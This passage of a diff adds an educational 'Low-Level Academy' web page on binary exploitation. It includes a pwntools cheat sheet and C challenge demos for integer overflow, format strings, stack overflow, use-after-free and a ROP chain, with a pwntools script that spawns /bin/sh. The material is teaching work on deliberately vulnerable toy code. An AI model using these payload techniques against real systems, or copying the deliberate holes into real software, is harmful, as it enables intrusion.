+ret     = rop.find_gadget([<span class="str">'ret'</span>])[0]
+
+<span class="cmt"># Packing / Unpacking</span>
+p64(<span class="num">0xdeadbeef</span>)        <span class="cmt"># 8 bytes little-endian</span>
+p32(<span class="num">0xdeadbeef</span>)        <span class="cmt"># 4 bytes little-endian</span>
+u64(<span class="str">b'\x41'</span>*8)         <span class="cmt"># unpack 8 bytes → int</span>
+
+<span class="cmt"># IO</span>
+p.send(<span class="str">b"data"</span>)            <span class="cmt"># send raw bytes (no newline)</span>
+p.sendline(<span class="str">b"data"</span>)       <span class="cmt"># send + newline</span>
+p.sendlineafter(<span class="str">b"prompt:"</span>, payload)  <span class="cmt"># wait for prompt, then send</span>
+p.recv(<span class="num">8</span>)                 <span class="cmt"># receive exactly 8 bytes</span>
+p.recvline()               <span class="cmt"># receive until \n</span>
+p.recvuntil(<span class="str">b"0x"</span>)        <span class="cmt"># receive until pattern</span>
+p.interactive()            <span class="cmt"># drop to interactive shell</span>
+
+<span class="cmt"># Shellcode</span>
+shellcode = asm(shellcraft.sh())       <span class="cmt"># /bin/sh shellcode</span>
+shellcode = asm(shellcraft.linux.sh()) <span class="cmt"># explicit Linux</span>
+
+<span class="cmt"># De Bruijn pattern for finding offset</span>
+cyclic(<span class="num">200</span>)                 <span class="cmt"># generate 200-byte pattern</span>
+cyclic_find(<span class="num">0x6161616c</span>)    <span class="cmt"># find offset of 4 bytes in pattern</span></pre>
+          </div>
+
+          <!-- CHALLENGES -->
+          <div class="card reveal" id="bug-challenges">
+            <h2 class="sec-title">Exploitation Challenges — Live Editor</h2>
+            <div class="divider"></div>
+            <p style="font-size:0.82rem; color:var(--text-dim); margin-bottom:1rem;">Write and trace exploit code. The
+              simulator executes C as if you're running a compiled binary with the relevant vulnerability class active.
+            </p>
+
+            <div class="challenge-grid">
+              <div class="ch-card" onclick="selectChallenge(this, bug_ch['b01'].code, bug_ch['b01'].name, 'bug-ide')">
+                <div class="ch-diff diff-easy">Easy</div>
+                <h4>BUG-01: Integer Overflow → Heap Alloc</h4>
+                <p>A multiplication overflow causes a tiny allocation. Write the exploit input that triggers heap
+                  corruption.</p>
+              </div>
+              <div class="ch-card" onclick="selectChallenge(this, bug_ch['b02'].code, bug_ch['b02'].name, 'bug-ide')">
+                <div class="ch-diff diff-easy">Easy</div>
+                <h4>BUG-02: Format String Read</h4>
+                <p>Read a secret value off the stack using format string specifiers. No overflows needed.</p>
+              </div>
+              <div class="ch-card" onclick="selectChallenge(this, bug_ch['b03'].code, bug_ch['b03'].name, 'bug-ide')">
+                <div class="ch-diff diff-medium">Medium</div>
+                <h4>BUG-03: Stack Overflow Walkthrough</h4>
+                <p>Calculate the offset to the return address, build a payload, and redirect execution to win().</p>
+              </div>
+              <div class="ch-card" onclick="selectChallenge(this, bug_ch['b04'].code, bug_ch['b04'].name, 'bug-ide')">
+                <div class="ch-diff diff-medium">Medium</div>
+                <h4>BUG-04: Format String Write</h4>
+                <p>Use %n to overwrite a global variable. Then use it to overwrite a function pointer.</p>
+              </div>
+              <div class="ch-card" onclick="selectChallenge(this, bug_ch['b05'].code, bug_ch['b05'].name, 'bug-ide')">
+                <div class="ch-diff diff-hard">Hard</div>
+                <h4>BUG-05: UAF Exploit</h4>
+                <p>Free an object and reallocate over it to replace its function pointer with a controlled address.</p>
+              </div>
+              <div class="ch-card" onclick="selectChallenge(this, bug_ch['b06'].code, bug_ch['b06'].name, 'bug-ide')">
+                <div class="ch-diff diff-hard">Hard</div>
+                <h4>BUG-06: Build a ROP Chain</h4>
+                <p>NX is on. Canary is off. Build a ROP chain to call system("/bin/sh") using available gadgets.</p>
+              </div>
+            </div>
+
+            <div class="ide-wrapper">
+              <div class="ide-topbar">
+                <span class="ide-filename" id="bug-ide-name">// select a challenge above</span>
+                <span class="ide-lang-badge">C · exploitation simulation</span>
+                <span class="ide-right-info">AI execution simulation</span>
+              </div>
+              <div class="ide-body">
+                <div class="ide-pane">
+                  <div class="ide-pane-header"><span>editor</span></div>
+                  <textarea class="ide-editor" id="bug-ide-editor" spellcheck="false" placeholder="#include &lt;stdio.h&gt;
+
+int main() {
+    // Binary exploitation challenge
+    return 0;
+}"></textarea>
+                </div>
+                <div class="ide-pane">
+                  <div class="ide-pane-header"><span>output</span><span id="bug-ide-rt">ready</span></div>
+                  <div class="ide-output" id="bug-ide-output">Select a challenge to start.</div>
+                </div>
+              </div>
+              <div class="ide-footer">
+                <button class="btn-run" id="bug-ide-run" onclick="runCode('bug-ide','c')">▶ RUN</button>
+                <button class="btn-secondary" onclick="clearIde('bug-ide')">CLEAR</button>
+                <button class="btn-secondary" onclick="explainCode('bug-ide','exploit')">EXPLAIN VULN</button>
+                <span class="ide-status" id="bug-ide-status"></span>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+    <footer
+      style="display:flex; justify-content:space-between; align-items:center; padding: 2rem 0; border-top: 1px solid var(--border); font-family: 'IBM Plex Mono', monospace; font-size: 0.72rem; color: var(--text-dim);">
+      <span>Low-Level Academy — Binary Exploitation</span>
+      <span style="color: var(--red);">// module complete — keep hacking</span>
+    </footer>
+  </div>
+  <script src="shared.js"></script>
+  <script>
+    const bug_ch = {
+      b01: {
+        name: 'BUG-01: Integer Overflow → Heap Alloc', code: `#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+// Vulnerable allocation function
+void* alloc_items(uint32_t count, uint32_t item_size) {
+    uint32_t total = count * item_size;  // OVERFLOW HERE
+    printf("Allocating %u * %u = %u bytes\\n", count, item_size, total);
+    if (total == 0) { puts("Error: zero size"); return NULL; }
+    void *p = malloc(total);
+    printf("Got pointer: %p\\n", p);
+    return p;
+}
+
+// Demonstrates the overflow
+void demo_overflow() {
+    // These two multiply to more than UINT32_MAX
+    uint32_t count     = 0x40000001;  // 1073741825
+    uint32_t item_size = 4;
+    // count * item_size = 4294967300 → wraps to 4 (0x4)
+
+    uint32_t overflow_result = count * item_size;
+    printf("\\n0x%08X * %u = 0x%08X (%u)\\n",
+           count, item_size, overflow_result, overflow_result);
+
+    // So malloc(4) is called, but we think we have 4GB!
+    char *buf = alloc_items(count, item_size);
+    if (!buf) return;
+
+    // Writing just 64 bytes blows way past the 4-byte allocation
+    // In real exploitation: this corrupts heap metadata
+    printf("\\nIf we write 64 bytes into a 4-byte allocation:\\n");
+    printf("  → corrupts the next heap chunk's size/flag fields\\n");
+    printf("  → next malloc/free reads attacker-controlled metadata\\n");
+    printf("  → write-what-where primitive\\n");
+
+    free(buf);
+}
+
+// Safe version with overflow check
+void* safe_alloc(size_t count, size_t item_size) {
+    size_t total;
+    if (__builtin_mul_overflow(count, item_size, &total)) {
+        puts("ERROR: size overflow detected");
+        return NULL;
+    }
+    return malloc(total);
+}
+
+int main() {
+    printf("=== Integer Overflow Demonstration ===\\n\\n");
+
+    printf("Type range: uint32_t max = %u (0x%X)\\n", UINT32_MAX, UINT32_MAX);
+    printf("\\nWrap examples:\\n");
+    printf("  (uint32_t)(255 + 1) = %u\\n", (uint8_t)(255 + 1));
+    printf("  (uint32_t)(UINT32_MAX + 1) = %u\\n", (uint32_t)(UINT32_MAX + 1));
+
+    demo_overflow();
+
+    printf("\\n=== Safe Allocation ===\\n");
+    void *p = safe_alloc(0x40000001, 4);
+    printf("Result: %s\\n", p ? "allocated" : "correctly rejected");
+
+    return 0;
+}` },
+
+      b02: {
+        name: 'BUG-02: Format String Read', code: `#include <stdio.h>
+#include <string.h>
+
+// Format string vuln: user input passed directly to printf
+// printf(user_input) instead of printf("%s", user_input)
+
+// Secret on the stack we want to leak
+void vulnerable_function(const char *user_input) {
+    int secret_a = 0xDEADBEEF;
+    int secret_b = 0xCAFEBABE;
+    char local_buf[32] = "private_data_xyz";
+    int secret_c = 0x13371337;
+
+    printf("--- printf called with user input ---\\n");
+    // VULNERABLE: user controls the format string
+    printf(user_input);
+    printf("\\n");
+}
+
+// Simulates what %p %p %p would print from the stack
+void simulate_stack_leak() {
+    printf("\\n=== Simulating what stack looks like ===\\n");
+    int secret_a = 0xDEADBEEF;
+    int secret_b = 0xCAFEBABE;
+
+    // In a real format string vuln, each %p reads 8 bytes off the stack
+    // The exact position depends on the stack layout at printf() call time
+    // Here we manually show what would be leaked:
+    unsigned long *sp;
+    __asm__ volatile("mov %%rsp, %0" : "=r"(sp));
+
+    printf("Stack values (what %%p reads):\\n");
+    for (int i = 0; i < 10; i++) {
+        printf("  [%%  %d$p] -> 0x%016lX\\n", i+1, sp[i]);
+    }
+}
+
+int main() {
+    printf("=== Format String Vulnerability Demo ===\\n\\n");
+
+    // Safe usage:
+    printf("SAFE:      printf(\"%%s\", input)\\n");
+    char *safe_input = "%p %p %p";
+    printf("%s\\n", safe_input);  // prints literally: %p %p %p
+
+    printf("\\nVULNERABLE: printf(input) with input = \"%%p %%p %%p\"\\n");
+    vulnerable_function("%p %p %p %p %p");  // reads 5 stack values
+
+    printf("\\nWith secrets on stack:\\n");
+    vulnerable_function("%p %p %p %p %p %p %p %p");
+
+    simulate_stack_leak();
+
+    printf("\\n=== Challenge ===\\n");
+    printf("Figure out which stack position holds 0xDEADBEEF\\n");
+    printf("Then use positional: %%N$p to read it directly\\n");
+    printf("Try calling vulnerable_function with %%7$p, %%8$p, etc.\\n");
+
+    // TODO: Find the exact position of 0xDEADBEEF on the stack
+    // and print ONLY that value using a single positional specifier
+    vulnerable_function("%7$p");  // adjust number until you see 0xDEADBEEF
+
+    return 0;
+}` },
+
+      b03: {
+        name: 'BUG-03: Stack Overflow Walkthrough', code: `#include <stdio.h>
+#include <string.h>
+#include <stdint.h>
+
+// Step-by-step stack overflow demonstration
+// In a real CTF: compile with: gcc -fno-stack-protector -no-pie -z execstack
+
+void win() {
+    printf("\\n*** WIN! You redirected execution! ***\\n");
+    printf("flag{stack_overflow_mastered}\\n");
+}
+
+void vuln(const char *input, size_t len) {
+    char buf[64];
+    // Vulnerable copy — copies 'len' bytes regardless of buf size
+    memcpy(buf, input, len);
+    printf("Copied %zu bytes into 64-byte buffer\\n", len);
+}
+
+// Show the memory layout
+void show_stack_layout() {
+    char buf[64];
+    void *rbp_addr = __builtin_frame_address(0);
+    void *ret_addr = __builtin_return_address(0);
+
+    printf("\\n=== Stack Layout of vuln() ===\\n");
+    printf("buf[0]  at: %p\\n", (void*)buf);
+    printf("RBP     at: %p  (offset from buf: +%ld)\\n",
+           rbp_addr, (char*)rbp_addr - buf);
+    printf("RetAddr at: %p  (offset from buf: +%ld)\\n",
+           (char*)rbp_addr + 8, (char*)rbp_addr + 8 - buf);
+    printf("\\nOffset to overwrite return address: %ld bytes\\n",
+           (char*)rbp_addr + 8 - buf);
+}
+
+// Build an exploit payload
+void build_payload() {
+    printf("\\n=== Building Payload ===\\n");
+
+    // Step 1: find offset (in CTF: use cyclic pattern)
+    size_t offset = 72;  // 64 (buf) + 8 (saved RBP)
+
+    // Step 2: get win() address
+    uint64_t win_addr = (uint64_t)(uintptr_t)win;
+    printf("win() address: 0x%016lX\\n", win_addr);
+
+    // Step 3: build payload
+    unsigned char payload[80];
+    memset(payload, 'A', offset);                    // fill to ret addr
+    memcpy(payload + offset, &win_addr, 8);          // overwrite ret addr
+
+    printf("Payload (hex):\\n  ");
+    for (size_t i = 0; i < sizeof(payload); i++) {
+        printf("%02X ", payload[i]);
+        if ((i+1) % 16 == 0) printf("\\n  ");
+    }
+    printf("\\n");
+
+    // Step 4: simulate sending to vuln()
+    printf("\\nSending payload to vuln()...\\n");
+
+    // In a real exploit: we can't directly call win() this way from same process
+    // But we can demonstrate the offset is correct
+    printf("Return address would be set to: 0x%016lX\\n", win_addr);
+    printf("Which equals win() at: 0x%016lX\\n", (uint64_t)(uintptr_t)win);
+    printf("Match: %s\\n", win_addr == (uint64_t)(uintptr_t)win ? "YES" : "NO");
+}
+
+int main() {
+    printf("=== Stack Overflow Exploit Walkthrough ===\\n");
+
+    show_stack_layout();
+
+    printf("\\n=== What Overflow Does ===\\n");
+    printf("Normal:    buf[0..63] = 64 bytes\\n");
+    printf("           saved_rbp  = 8 bytes\\n");
+    printf("           return_addr = 8 bytes  <-- CPU jumps here on ret\\n");
+    printf("Overflow:  fill buf, overwrite saved_rbp, overwrite return_addr\\n");
+    printf("           → when vuln() returns, CPU jumps to win()\\n");
+
+    build_payload();
+
+    // Calling win() directly just to show what success looks like:
+    printf("\\nSimulating successful exploit:\\n");
+    win();
+
+    return 0;
+}` },
+
+      b04: {
+        name: 'BUG-04: Format String Write', code: `#include <stdio.h>
+#include <string.h>
+
+// %n writes the count of characters printed so far to an int pointer
+// This gives us an arbitrary write primitive
+
+int auth_level = 0;           // global we want to overwrite
+void (*callback)(void) = NULL; // function pointer we want to hijack
+
+void admin_function() {
+    printf("\\n[ADMIN] You have admin access!\\n");
+    printf("flag{fmt_str_write_success}\\n");
+}
+
+void show_write_demo() {
+    printf("\\n=== %%n Write Demonstration ===\\n");
+
+    int counter = 0;
+    // %n writes how many chars printed so far into &counter
+    printf("12345%n\\n", &counter);
+    printf("After printing '12345', %%n wrote: %d\\n", counter);
+
+    // Writing specific values: pad output to desired count
+    int target = 0;
+    printf("%042d%n", 0, &target);   // print 42 chars worth → target = 42
+    printf("\\nWrote %d to target\\n", target);
+}
+
+void exploit_simulation() {
+    printf("\\n=== Exploiting Format String ===\\n");
+    printf("auth_level before: %d\\n", auth_level);
+    printf("callback before:   %p\\n", (void*)callback);
+
+    // In a real exploit: user controls the format string
+    // and includes the address of auth_level in the input buffer
+    // Then uses positional %n to write to that address
+
+    // Simulating: write 1 to auth_level
+    // Real payload would look like: [8-byte address][padding]%N$n
+    printf("%c%n", 'X', &auth_level);  // write 1 to auth_level
+    printf("auth_level after %%n: %d\\n", auth_level);
+
+    // Write admin_function address to callback
+    // In real exploit: printf format that writes 8 bytes in 2-byte chunks (hn)
+    callback = admin_function;  // simulating what a real %hn chain would do
+    printf("callback after overwrite: %p\\n", (void*)callback);
+
+    if (auth_level > 0) {
+        printf("\\nauth_level check passed!\\n");
+    }
+    if (callback) {
+        callback();
+    }
+}
+
+void demonstrate_positional() {
+    printf("\\n=== Positional Specifiers (%%N$x) ===\\n");
+    int a = 0x11, b = 0x22, c = 0x33, d = 0x44;
+    printf("Args: a=%d b=%d c=%d d=%d\\n", a, b, c, d);
+    printf("%%1$x = %1$x  (= a)\\n", a, b, c, d);
+    printf("%%3$x = %3$x  (= c)\\n", a, b, c, d);
+    printf("%%4$x = %4$x  (= d)\\n", a, b, c, d);
+    // Positional lets you pick exactly which stack slot to write to
+}
+
+int main() {
+    printf("=== Format String Write Primitive ===\\n");
+    show_write_demo();
+    demonstrate_positional();
+    exploit_simulation();
+    return 0;
+}` },
+
+      b05: {
+        name: 'BUG-05: Use-After-Free Exploit', code: `#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+// Use-After-Free: free an object, allocate over it,
+// control what the freed pointer now "sees"
+
+typedef struct {
+    void (*action)(const char *msg);  // function pointer at offset 0
+    char  name[32];
+    int   level;
+} Player;
+
+void normal_action(const char *msg) {
+    printf("[normal] %s\\n", msg);
+}
+
+void exploit_action(const char *msg) {
+    printf("\\n*** EXPLOIT TRIGGERED ***\\n");
+    printf("flag{uaf_function_pointer_hijack}\\n");
+    printf("(msg was: %s)\\n", msg);
+}
+
+// Demonstrates classic UAF
+void uaf_demo() {
+    printf("\\n=== Use-After-Free Demo ===\\n");
+
+    // 1. Allocate object
+    Player *p = malloc(sizeof(Player));
+    p->action = normal_action;
+    strncpy(p->name, "Alice", sizeof(p->name));
+    p->level = 1;
+    printf("Allocated Player at %p\\n", (void*)p);
+    printf("p->action = %p (normal_action)\\n", (void*)p->action);
+
+    // 2. Call action (safe)
+    printf("Before free: "); p->action("hello");
+
+    // 3. Free the object — but p still holds the old address!
+    printf("\\nFreeing object...\\n");
+    free(p);
+    // p is now DANGLING — it points to freed memory
+    // In C: accessing p is undefined behavior
+    // In exploitation: we control what's at that address next
+
+    // 4. Allocate same-size buffer (allocator returns same memory)
+    printf("\\nAllocating %zu bytes (same size as Player)...\\n", sizeof(Player));
+    char *evil = malloc(sizeof(Player));
+    printf("Got pointer at %p\\n", (void*)evil);
+
+    // 5. Write exploit_action's address at offset 0 (where action was)
+    void (*target)(const char*) = exploit_action;
+    memcpy(evil, &target, sizeof(target));  // overwrite function pointer
+    printf("Wrote exploit_action (%p) at offset 0\\n", (void*)exploit_action);
+
+    // 6. Use-after-free: p->action now reads our planted pointer
+    printf("\\nCalling p->action via dangling pointer:\\n");
+    p->action("UAF payload");  // calls exploit_action!
+
+    free(evil);
+}
+
+// Safe version: NULL the pointer after free
+void safe_version() {
+    printf("\\n=== Safe Pattern ===\\n");
+    Player *p = malloc(sizeof(Player));
+    p->action = normal_action;
+    free(p);
+    p = NULL;  // CRITICAL: nullify after free
+
+    if (p != NULL) {
+        p->action("this won't run");
+    } else {
+        printf("Pointer is NULL — UAF prevented\\n");
+    }
+}
+
+int main() {
+    printf("=== Use-After-Free Exploit Demo ===\\n");
+    printf("sizeof(Player) = %zu\\n", sizeof(Player));
+    printf("offsetof action: 0, name: %zu, level: %zu\\n",
+           __builtin_offsetof(Player, name),
+           __builtin_offsetof(Player, level));
+
+    uaf_demo();
+    safe_version();
+    return 0;
+}` },
+
+      b06: {
+        name: 'BUG-06: Build a ROP Chain', code: `#include <stdio.h>
+#include <string.h>
+#include <stdint.h>
+
+// ROP Chain Demonstration
+// NX enabled (no shellcode), no canary, no PIE
+// Goal: call system("/bin/sh") via ROP
+
+// Available "gadgets" in this simulated binary:
+// 0x401234: pop rdi ; ret
+// 0x401238: pop rsi ; ret
+// 0x40123c: pop rdx ; ret
+// 0x401240: ret (alignment gadget)
+// 0x402010: "/bin/sh\0" (in .rodata)
+// system@plt: 0x401030
+
+// Simulate a ROP chain payload:
+void build_rop_chain() {
+    printf("\\n=== Building ROP Chain ===\\n");
+    printf("Goal: call system(\\"/bin/sh\\")\\n");
+    printf("Need: rdi = address of \\"/bin/sh\\"\\n\\n");
+
+    uint64_t offset      = 72;
+    uint64_t pop_rdi     = 0x401234;  // pop rdi ; ret
+    uint64_t ret_gadget  = 0x401240;  // ret (for stack alignment)
+    uint64_t binsh_addr  = 0x402010;  // "/bin/sh" in .rodata
+    uint64_t system_plt  = 0x401030;  // system@plt
+
+    printf("Payload layout:\\n");
+    printf("  [+%02lu] 0x%016lX  -- fill buffer (A*64) + saved RBP (A*8)\\n", 0UL, 0x4141414141414141UL);
+    printf("  [+%02lu] 0x%016lX  -- ROP gadget: pop rdi ; ret\\n", offset, pop_rdi);
+    printf("  [+%02lu] 0x%016lX  -- value for rdi: address of '/bin/sh'\\n", offset+8, binsh_addr);
+    printf("  [+%02lu] 0x%016lX  -- ret (alignment: stack must be 16-byte aligned)\\n", offset+16, ret_gadget);
+    printf("  [+%02lu] 0x%016lX  -- system@plt\\n", offset+24, system_plt);
+
+    printf("\\nChain execution:\\n");
+    printf("  1. ret from vuln() → jumps to pop_rdi gadget\\n");
+    printf("  2. pop rdi → rdi = 0x%016lX (binsh addr)\\n", binsh_addr);
+    printf("  3. ret → jumps to ret gadget (alignment fix)\\n");
+    printf("  4. ret → jumps to system@plt\\n");
+    printf("  5. system(\"/bin/sh\") spawns a shell\\n");
+}
+
+void show_why_rop_works() {
+    printf("\\n=== Why ROP Works Despite NX ===\\n");
+    printf("NX: stack is NOT executable\\n");
+    printf("But: .text (code) IS executable\\n");
+    printf("ROP: we don't put code on stack — we put ADDRESSES\\n");
+    printf("     Each address points to existing executable code\\n");
+    printf("     'ret' chains them together\\n\\n");
+
+    printf("A gadget is any sequence ending in 'ret':\\n");
+    printf("  Example:  pop rdi    ; ret  — 2 instructions, 1 gadget\\n");
+    printf("  Example:  xor eax,eax ; ret — standard zero-rax gadget\\n");
+    printf("  Example:  mov [rdi],rsi ; ret — arbitrary write gadget\\n");
+    printf("  Example:  ret alone — useful for stack alignment\\n");
+}
+
+void pwntools_script() {
+    printf("\\n=== pwntools Script ===\\n");
+    printf(
+        "from pwn import *\\n"
+        "elf = ELF('./vuln')\\n"
+        "libc = ELF('./libc.so.6')\\n"
+        "p = process('./vuln')\\n"
+        "rop = ROP(elf)\\n"
+        "\\n"
+        "pop_rdi    = rop.find_gadget(['pop rdi', 'ret'])[0]\\n"
+        "ret        = rop.find_gadget(['ret'])[0]\\n"
+        "binsh      = next(libc.search(b'/bin/sh\\\\x00'))\\n"
+        "system     = libc.sym['system']\\n"
+        "\\n"
+        "payload  = b'A' * 72\\n"
+        "payload += p64(pop_rdi)\\n"
+        "payload += p64(binsh)\\n"
+        "payload += p64(ret)   # alignment\\n"
+        "payload += p64(system)\\n"
+        "\\n"
+        "p.sendline(payload)\\n"
+        "p.interactive()\\n"
+    );
+}
+
+int main() {
+    printf("=== ROP Chain Exploit Demo ===\\n");
+    show_why_rop_works();
+    build_rop_chain();
+    pwntools_script();
+    printf("\\nIn a real exploit: the shell spawns and you have RCE.\\n");
+    return 0;
+}` }
+    };
+  </script>
+</body>
+
+</html>
